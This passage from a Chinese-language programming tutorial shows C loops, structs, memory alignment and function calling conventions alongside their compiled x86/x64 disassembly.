class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">int a = 10;</span><br><span class="line">00007FF72566520B  mov         dword ptr [a],0Ah  </span><br><span class="line">/* while 循环执⾏ */</span><br><span class="line">while (a &lt; 20)</span><br><span class="line">00007FF725665212  cmp         dword ptr [a],14h  </span><br><span class="line">00007FF725665216  jge         main+49h (07FF725665239h)  </span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;a 的值： %d\n&quot;, a);</span><br><span class="line">00007FF725665218  mov         edx,dword ptr [a]  </span><br><span class="line">00007FF72566521B  lea         rcx,[string &quot;a \xb5\xc4\xd6\xb5\xa3\xba %d\n&quot; (07FF725669C10h)]  </span><br><span class="line">00007FF725665222  call        printf (07FF72566118Bh)  </span><br><span class="line">a++;</span><br><span class="line">00007FF725665227  mov         eax,dword ptr [a]  </span><br><span class="line">00007FF72566522A  inc         eax  </span><br><span class="line">00007FF72566522C  mov         dword ptr [a],eax  </span><br><span class="line">if (a &gt; 15)</span><br><span class="line">00007FF72566522F  cmp         dword ptr [a],0Fh  </span><br><span class="line">00007FF725665233  jle         main+47h (07FF725665237h)  </span><br><span class="line">&#123;</span><br><span class="line">/* 使⽤ break 语句终⽌循环 */</span><br><span class="line">break;</span><br><span class="line">00007FF725665235  jmp         main+49h (07FF725665239h)  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">00007FF725665237  jmp         main+22h (07FF725665212h)  </span><br><span class="line">return 0;</span><br><span class="line">00007FF725665239  xor         eax,eax  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>break 后直接跳出循环</p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* for 循环执⾏ */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">10</span>; a &lt; <span class="number">20</span>; a = a++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a 的值： %d\n&quot;</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/* for 循环执⾏ */</span><br><span class="line">for (int a = 10; a &lt; 20; a = a++)</span><br><span class="line">00EC1865  mov         dword ptr [ebp-8],0Ah  </span><br><span class="line">00EC186C  jmp         __$EncStackInitStart+31h (0EC187Dh)  </span><br><span class="line">00EC186E  mov         eax,dword ptr [ebp-8]  </span><br><span class="line">00EC1871  mov         dword ptr [ebp-8],eax  </span><br><span class="line">00EC1874  mov         ecx,dword ptr [ebp-8]  </span><br><span class="line">00EC1877  add         ecx,1  </span><br><span class="line">00EC187A  mov         dword ptr [ebp-8],ecx  </span><br><span class="line">00EC187D  cmp         dword ptr [ebp-8],14h  </span><br><span class="line">00EC1881  jge         __$EncStackInitStart+4Ah (0EC1896h)  </span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;a 的值： %d\n&quot;, a);</span><br><span class="line">00EC1883  mov         eax,dword ptr [ebp-8]  </span><br><span class="line">00EC1886  push        eax  </span><br><span class="line">00EC1887  push        offset string &quot;a \xb5\xc4\xd6\xb5\xa3\xba %d\n&quot; (0EC7B30h)  </span><br><span class="line">00EC188C  call        _printf (0EC10CDh)  </span><br><span class="line">00EC1891  add         esp,8  </span><br><span class="line">&#125;</span><br><span class="line">00EC1894  jmp         __$EncStackInitStart+22h (0EC186Eh)  </span><br><span class="line">return 0;</span><br><span class="line">00EC1896  xor         eax,eax  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="do…-while循环"><a href="#do…-while循环" class="headerlink" title="do….while循环"></a>do….while循环</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 局部变量定义 */</span></span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="comment">/* do 循环执⾏，在条件被测试之前⾄少执⾏⼀次 */</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">15</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 跳过迭代 */</span></span><br><span class="line">a = a + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a 的值： %d\n&quot;</span>, a);</span><br><span class="line">a = a++;</span><br><span class="line">&#125; <span class="keyword">while</span> (a &lt; <span class="number">20</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">/* 局部变量定义 */</span><br><span class="line">int a = 10;</span><br><span class="line">00261865  mov         dword ptr [a],0Ah  </span><br><span class="line">/* do 循环执⾏，在条件被测试之前⾄少执⾏⼀次 */</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">if (a == 15)</span><br><span class="line">0026186C  cmp         dword ptr [a],0Fh  </span><br><span class="line">00261870  jne         __$EncStackInitStart+31h (026187Dh)  </span><br><span class="line">&#123;</span><br><span class="line">/* 跳过迭代 */</span><br><span class="line">a = a + 1;</span><br><span class="line">00261872  mov         eax,dword ptr [a]  </span><br><span class="line">00261875  add         eax,1  </span><br><span class="line">00261878  mov         dword ptr [a],eax  </span><br><span class="line">continue;</span><br><span class="line">0026187B  jmp         __$EncStackInitStart+51h (026189Dh)  </span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;a 的值： %d\n&quot;, a);</span><br><span class="line">0026187D  mov         eax,dword ptr [a]  </span><br><span class="line">00261880  push        eax  </span><br><span class="line">00261881  push        offset string &quot;a \xb5\xc4\xd6\xb5\xa3\xba %d\n&quot; (0267B30h)  </span><br><span class="line">00261886  call        _printf (02610CDh)  </span><br><span class="line">0026188B  add         esp,8  </span><br><span class="line">a = a++;</span><br><span class="line">0026188E  mov         eax,dword ptr [a]  </span><br><span class="line">00261891  mov         dword ptr [a],eax  </span><br><span class="line">00261894  mov         ecx,dword ptr [a]  </span><br><span class="line">00261897  add         ecx,1  </span><br><span class="line">0026189A  mov         dword ptr [a],ecx  </span><br><span class="line">&#125; while (a &lt; 20);</span><br><span class="line">0026189D  cmp         dword ptr [a],14h  </span><br><span class="line">002618A1  jl          __$EncStackInitStart+20h (026186Ch)  </span><br><span class="line">return 0;</span><br><span class="line">002618A3  xor         eax,eax  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>这里的循环都很简单，主要是要自己写出来后去反汇编一下。多看看这些反汇编后的代码。</p><h1 id="2-结构体"><a href="#2-结构体" class="headerlink" title="2.结构体"></a>2.结构体</h1><h2 id="结构体？"><a href="#结构体？" class="headerlink" title="结构体？"></a>结构体？</h2><p>结构体就是数组升级版….可以自定义其中的数据类型。</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>用 struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tag</span> &#123;</span></span><br><span class="line">     member-<span class="built_in">list</span></span><br><span class="line">     member-<span class="built_in">list</span></span><br><span class="line">     member-<span class="built_in">list</span> </span><br><span class="line">     ...</span><br><span class="line">&#125; variable-<span class="built_in">list</span> ;</span><br><span class="line"><span class="comment">//这样直接初始化</span></span><br><span class="line">也可以在后续中  <span class="class"><span class="keyword">struct</span> <span class="title">tag</span> <span class="title">lll</span>;</span></span><br></pre></td></tr></table></figure><ul><li>tag 是结构体的标签。也就是一个大名字</li><li>member-list 标准的变量定义。比如：int.. float.. char..</li><li>variable-list 结构体变量。【对象？】</li></ul><p>比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Books</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     <span class="type">char</span> title[<span class="number">50</span>];</span><br><span class="line">     <span class="type">char</span> author[<span class="number">50</span>];</span><br><span class="line">     <span class="type">char</span> subject[<span class="number">100</span>];</span><br><span class="line">     <span class="type">int</span> book_id;</span><br><span class="line">&#125; book;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="type">int</span> a;</span><br><span class="line"> <span class="type">char</span> b;</span><br><span class="line"> <span class="type">double</span> c;</span><br><span class="line">&#125; s1;</span><br><span class="line"><span class="comment">//此声明声明了拥有3个成员的结构体，分别为整型的a，字符型的b和双精度的c</span></span><br><span class="line"><span class="comment">//同时⼜声明了结构体变量s1</span></span><br><span class="line"><span class="comment">//这个结构体并没有标明其标签</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SIMPLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="type">int</span> a;</span><br><span class="line"> <span class="type">char</span> b;</span><br><span class="line"> <span class="type">double</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//⽤SIMPLE标签的结构体，另外声明了变量t1、t2、t3</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SIMPLE</span> <span class="title">t1</span>, <span class="title">t2</span>[20], *<span class="title">t3</span>;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//也可以⽤typedef创建新类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="type">int</span> a;</span><br><span class="line"> <span class="type">char</span> b;</span><br><span class="line"> <span class="type">double</span> c;</span><br><span class="line">&#125; Simple2;</span><br><span class="line"><span class="comment">//现在可以⽤Simple2作为类型声明新的结构体变量</span></span><br><span class="line">Simple2 u1, u2[<span class="number">20</span>], *u3;</span><br></pre></td></tr></table></figure><p>结构体里面可以包含结构体哦~</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//此结构体的声明包含了其他的结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">COMPLEX</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="type">char</span> <span class="built_in">string</span>[<span class="number">100</span>];</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">SIMPLE</span> <span class="title">a</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结构体里面可以包含自己结构体类型的指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//此结构体的声明包含了指向⾃⼰类型的指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="type">char</span> <span class="built_in">string</span>[<span class="number">100</span>];</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">next_node</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果2给结构体相互包含，则需要对其中一个结构体进行不完整声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">B</span>;</span> <span class="comment">//对结构体B进⾏不完整声明</span></span><br><span class="line"><span class="comment">//结构体A中包含指向结构体B的指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">B</span> *<span class="title">partner</span>;</span></span><br><span class="line"><span class="comment">//other members;</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="comment">//结构体B中包含指向结构体A的指针，在A声明完后，B也随之进⾏声明</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">A</span> *<span class="title">partner</span>;</span></span><br><span class="line"> <span class="comment">//other members;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="结构体的初始化"><a href="#结构体的初始化" class="headerlink" title="结构体的初始化"></a>结构体的初始化</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Books</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     <span class="type">char</span> title[<span class="number">50</span>];</span><br><span class="line">     <span class="type">char</span> author[<span class="number">50</span>];</span><br><span class="line">     <span class="type">char</span> subject[<span class="number">100</span>];</span><br><span class="line">     <span class="type">int</span> book_id;</span><br><span class="line">&#125; book = &#123;<span class="string">&quot;C 语⾔&quot;</span>, <span class="string">&quot;RYH&quot;</span>, <span class="string">&quot;编程语⾔&quot;</span>, <span class="number">123456</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;title : %s\nauthor: %s\nsubject: %s\nbook_id: %d\n&quot;</span>,</span><br><span class="line">    book.title, book.author, book.subject, book.book_id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="访问结构成员"><a href="#访问结构成员" class="headerlink" title="访问结构成员"></a>访问结构成员</h2><p>访问的时候，用：结构体变量名.成员名字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">book.title</span><br></pre></td></tr></table></figure><h2 id="结构题变量的储存原理"><a href="#结构题变量的储存原理" class="headerlink" title="结构题变量的储存原理"></a>结构题变量的储存原理</h2><h3 id="1-数据成员对齐。"><a href="#1-数据成员对齐。" class="headerlink" title="1.数据成员对齐。"></a>1.数据成员对齐。</h3><p>在内存中各类型的数据会按照一定的规律在内存中存放，这样就是对齐。结构体所占的内存空间就是每个成员对齐后存放的时候所占用的字节数。</p><p>how？</p><p>数据的起始地址的值要求是某个数K的倍数，而K就是该数据类型的对齐模数。</p><p>why？</p><p>加快速度，提升读取速度。</p><h3 id="2-计算结构体大小的计算方法"><a href="#2-计算结构体大小的计算方法" class="headerlink" title="2.计算结构体大小的计算方法"></a>2.计算结构体大小的计算方法</h3><p>对齐模数是 #pragma pack 指定的数值与该数据成员自身长度相比较得到的数值较小者。该数据相对起始位置应该是对齐数模的整数倍。</p><p>数模A是：#pragma pack指定的数值和结构体内最大的基本数据类型成员长度相比得到的数值较小者</p><p>然后结构体的长度应该是数模A的整数倍</p><p>#pragma pack指令的作用就是改变编译器的默认对齐方式</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230507225004987.png" alt="image-20230507225004987"></p><p><strong>实例</strong>1.</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230507225800322.png" alt="image-20230507225800322" style="zoom:50%;" /><p><strong>实例2</strong>.</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230507225914727.png" alt="image-20230507225914727" style="zoom:50%;" /><p>分析一手：第一题：</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230507231309207.png" alt="image-20230507231309207" style="zoom:50%;" /><p>这样就只占有了8个字节的位置。</p><p>int型开始的时候，需要是0，4，8，…就是比较后小的的倍数</p><p>char 啥都可以</p><p>short 的 是2个字节，所以需要是 0 2 4 6….【2的倍数】，这也就是这个5为什么要跳过的原因</p><p>第二题：</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230507231535494.png" alt="image-20230507231535494" style="zoom:50%;" /><p>这里 int a 开始的时候需要是数模的倍数【int 是4 默认是8 较小的是4 ， 所以需要4的倍数。也就是这里空了3个格子的原因】</p><p>short c 这里开始的时候刚好的8【2的倍数】所以就不需要空。</p><p>从0~9整体是10。这个时候结构体也需要对齐。结构体的数模是：定义的最大和默认比较中最小的【也就是int 和默认的比较 也就是4】需要是这个数模的倍数，也就是4的倍数。所以需要扩大2个字节，变成12。</p><p>所以整个结构体的占有的空间是12个字节</p><h1 id="3-函数调用约定"><a href="#3-函数调用约定" class="headerlink" title="3.函数调用约定"></a>3.函数调用约定</h1><p>这个函数调用的约定，其实，我们再win32中已经有接触过。这里来讲一讲C语言的</p><p>在C语言中，假设我们有这样的一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">function</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br></pre></td></tr></table></figure><p>在调用的时候，只要用result = function(1,2)这样的方式就可以使用这个函数了。</p><p>在CPU中，计算机是如何知道这函数调用的参数呢？这里计算机就提供了一个称为栈的数据结构来支持参数传递</p><p>栈的简述：是一种先进后出的数据结构。这里就不再累赘了。</p><p>再参数的传递中，有2个很重要的问题</p><ul><li>当参数多于1个的时候，按照什么样的顺序压入堆栈【从左到右？从右到左？】</li><li>函数调用会，由谁来把堆栈恢复原来的状态</li></ul><h2 id="函数几种调用约定"><a href="#函数几种调用约定" class="headerlink" title="函数几种调用约定"></a>函数几种调用约定</h2><ul><li>stdcall 【pascal】</li><li>cdecl</li><li>fastcall</li><li>thiscall</li><li>naked call</li></ul><h3 id="stdcall【pascal】"><a href="#stdcall【pascal】" class="headerlink" title="stdcall【pascal】"></a>stdcall【pascal】</h3><p>Standard Call 的缩写 ，C++的标准调用方式</p><p>再微软C++系类的C/C++编译器中，常用PASCAL宏来声明这个调用约定，类似的宏还有WINAPI和CALLBACK</p><p>一般WIN32的函数都是__stdcall</p><p>声明的语法为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">function</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//参数从右往左压入堆栈</span></span><br><span class="line"><span class="comment">//函数自身清理堆栈</span></span><br><span class="line"><span class="comment">//函数名自动加前导的下划线，后面跟着一个@符号，其后跟着参数的尺寸</span></span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">Plus</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push 2 </span><br><span class="line">push 1 </span><br><span class="line">call @ILT+10(Plus) (0040100f) </span><br><span class="line"> </span><br><span class="line">函数内部： </span><br><span class="line"> </span><br><span class="line">ret 8 ;这句是call对应的，内平栈</span><br></pre></td></tr></table></figure><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h3><p>C Declaration 的缩写 ，C语言缺省的调用约定【C语言默认调用约定】</p><p>声明语法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">function</span> <span class="params">(<span class="type">int</span> a ,<span class="type">int</span> b)</span> <span class="comment">//不加修饰就是C调⽤约定</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">function</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span><span class="comment">//明确指出C调⽤约定</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//参数从右向左压⼊堆栈</span></span><br><span class="line"><span class="comment">//调⽤者负责清理堆栈</span></span><br><span class="line"><span class="comment">//C调⽤约定允许函数的参数的个数是不固定的，这也是C语⾔的⼀⼤特⾊。</span></span><br><span class="line"><span class="comment">//仅在函数名前加上⼀个下划线前缀，格式为_functionname</span></span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">Plus</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push 2 </span><br><span class="line">push 1 </span><br><span class="line">call @ILT+15(Plus) (00401014) </span><br><span class="line">add esp,8 ;这个就是外⾯平衡堆栈，传⼊两个参数，且为int型4byte，所以是8</span><br></pre></td></tr></table></figure><h3 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h3><p>快速的call ， 所以会用寄存器</p><p>声明语法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fastcall <span class="title function_">function</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line"><span class="comment">//函数的第⼀个和第⼆个DWORD参数（或者尺⼨更⼩的）通过ecx和edx传递，其他参数通过从右向左的顺序压栈</span></span><br><span class="line"><span class="comment">//函数⾃身清理堆栈</span></span><br><span class="line"><span class="comment">//函数名修改规则同stdcall:函数名⾃动加前导的下划线，后⾯紧跟⼀个@符号，其后紧跟着参数的尺⼨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//优先使用寄存器传入参数</span></span><br></pre></td></tr></table></figure><p>例字1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Plus</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov edx,2 ;因为传⼊寄存器不需要平衡堆栈 </span><br><span class="line">mov ecx,1 </span><br><span class="line">call @ILT+0(Plus) (00401005)</span><br><span class="line"></span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>例子2：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Plus4</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c, <span class="type">int</span> d)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> a + b + c + d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push 4 ;当参数⼤于两个时，编译器会倒着存⼊堆栈，剩两个存⼊寄存器⾥ </span><br><span class="line">push 3 </span><br><span class="line">mov edx,2 </span><br><span 